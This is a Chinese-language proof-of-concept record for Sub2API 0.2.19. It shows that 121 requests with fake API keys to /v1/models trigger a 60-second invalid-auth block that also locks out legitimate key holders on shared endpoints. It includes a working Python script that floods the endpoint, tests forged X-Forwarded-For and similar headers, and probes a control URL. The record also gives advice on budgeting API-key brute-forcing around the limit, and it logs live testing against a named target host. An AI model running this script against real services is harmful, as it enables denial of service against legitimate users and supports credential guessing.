# Sub2API 0.2.19 /v1/models 匿名错 key 打满 invalid_auth 限流（120/60s→封60s，桶与 /v1beta、/images 共享，客户端转发头不可重置）

- **code**: sub2api-invalid-auth-rate-limit-429-shared-bucket-dos
- **kind**: poc
- **category**: waf
- **component**: Sub2API (Wei-Shaw/sub2api) middleware/api_key_auth.go + ingress_reject.go invalid_auth 限流
- **versions**: 0.2.19（默认配置 api_key_auth_cache.invalid_abuse threshold=120 / block_seconds=60）
- **severity**: low
- **language**: python
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-01 08:1x-08:2x UTC，task#609，本机 Windows 直连 https://target485.example.com（Sub2API 0.2.19），脚本 burst2.py / rl.py 两次独立复现：前 120 次全部 401 {"code":"INVALID_API_KEY"}，第 121 次精确返回 HTTP 429 + Retry-After: 60 + {"code":"INVALID_AUTH_RATE_LIMITED"}（t≈11.3s），与源码默认 threshold=120/block_seconds=60 吻合；封禁期内改用 X-Forwarded-For / X-Real-IP / CF-Connecting-IP / Forwarded / XFF 双值均仍 429（RA=50 递减），证明客户端头无法重置限流 key；同刻 GET /api/v1/settings/public 仍 200，POST /v1/images/generations 与 GET /v1beta/models 均 429，证明桶共享且只作用在 apiKeyAuth 链；源码侧 middleware/api_key_auth.go:37、ingress_reject.go:44-46、target486.example.com:2379-2380 三处对齐。另外 HEAD /v1/models 恒 404、OPTIONS 恒 403 不计入计数。
- **path**: pocs/sub2api-invalid-auth-rate-limit-429-shared-bucket-dos/sub2api_invalid_auth_dos.py
- **tags**: sub2api,rate-limit,dos,invalid_auth,429,retry-after,api-key,限流预算,x-forwarded-for,new-api系
- **created_at**: 2026-11-01T08:23:44.752Z
- **engine**: https://target485.example.com
- **found_by**: vuln-scan

## 描述

Sub2API 的 invalid_auth 护栏在 middleware/api_key_auth.go 第一行、先于任何鉴权判断执行，默认阈值 120 次/60s，超阈对「服务端解析出的客户端 IP」封 60s。攻击者零凭据连发 121 个不同的假 x-api-key 即可把封禁打满，且该桶与 /v1beta、/images 等 apiKeyAuth 链共享，封禁期内持有效 key 的合法调用同样 429 —— 低成本 DoS。反向用途：爆破/验证 key 的预算被硬限制在 120 次/60s 并共享同桶，需按此规划速率。

## 用法

```
前置：目标为 Sub2API 系（GET /api/v1/settings/public 返回 {"code":0,"message":"success"}、前端 bundle 含 sub2api 可指纹）；无需任何凭据。
用法：
  python sub2api_invalid_auth_dos.py https://TARGET
判据（四条同时成立才认定）：
  1) 前 120 次请求全部 401 {"code":"INVALID_API_KEY"}（每次必须换一个不同的假 key，同 key 复用在部分版本会被缓存但计数口径不变，换 key 更稳）；
  2) 第 121 次出现 HTTP 429 + 响应头 Retry-After: 60 + {"code":"INVALID_AUTH_RATE_LIMITED"}，与源码默认 threshold=120/block=60 吻合；
  3) 封禁期内换 X-Forwarded-For / X-Real-IP / CF-Connecting-IP / Forwarded 均仍 429（限流 key 取服务端 SecurityClientIP，客户端头无效）——若目标前面挂的 CDN/反代 trust proxy 配置不同导致换头生效，本条对该目标降级为「可换 IP 绕过」而非 DoS；
  4) 封禁期内 GET /api/v1/settings/public 仍 200（证明只有 apiKeyAuth 链被封，不是整站 429）。
换出口 IP 即可立刻解封。注意不计数的出口：HEAD /v1/models 恒 404（gin 只注册 GET）、OPTIONS /v1/models 恒 403（边缘短路），用这两个探活会误判「限流坏了」。
持续时间：封禁按服务端计数窗口滑动，实测封满后 Retry-After 从 60 递减；期间不要原地重试，会把窗口续上。
```

## 正文

```
# Sub2API invalid_auth 限流打满 PoC
# 原理：middleware/api_key_auth.go:37 先于鉴权调用 rejectInvalidAuthAbuse()
#      -> ingress_reject.go:44-46 invalidAuthClientKey = normalizeIngressRejectIP(SecurityClientIP(c))
#      -> target486.example.com:2379-2380 默认 threshold=120 / block_seconds=60
# 结果：第 121 次 429 Retry-After: 60；桶被 /v1beta、/images 共享；伪造转发头无效

import sys, time, urllib.request, urllib.error

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8080"
URL = BASE + "/v1/models"
N = 130

def get(headers=None):
    req = urllib.request.Request(URL, headers={"User-Agent": "Mozilla/5.0", **(headers or {})})
    try:
        r = urllib.request.urlopen(req, timeout=10)
        return r.status, r.headers.get("Retry-After"), r.read(200).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("Retry-After"), e.read(200).decode("utf-8", "replace")
    except Exception as e:
        return -1, None, repr(e)

t0 = time.time()
first429 = None
for i in range(1, N + 1):
    st, ra, body = get({"x-api-key": f"sk-invalid-{i}"})
    print(f"{i}\t{st}\tRA={ra}\tt={time.time()-t0:.1f}s\t{body[:80]}")
    if st == 429 and first429 is None:
        first429 = i
        print(f"*** 429 first hit at request #{i}, Retry-After={ra}")
        break

# 封禁期内：伪造转发头一律应仍为 429（证明客户端头不能重置限流 key）
for h in ({"X-Forwarded-For": "203.0.113.77"},
          {"X-Real-IP": "203.0.113.78"},
          {"CF-Connecting-IP": "203.0.113.79"},
          {"Forwarded": "for=203.0.113.80"}):
    st, ra, body = get({"x-api-key": "sk-other", **h})
    print(f"[hdr] {list(h)[0]}\t{st}\tRA={ra}\t(期望 429)")

# 对照：非 apiKeyAuth 链应为 200
def probe_public():
    req = urllib.request.Request(BASE + "/api/v1/settings/public", headers={"User-Agent": "Mozilla/5.0"})
    try:
        r = urllib.request.urlopen(req, timeout=10); return r.status
    except urllib.error.HTTPError as e:
        return e.code
print(f"[ctrl] /api/v1/settings/public -> {probe_public()} (期望 200，证明仅 apiKeyAuth 链被封)")

```
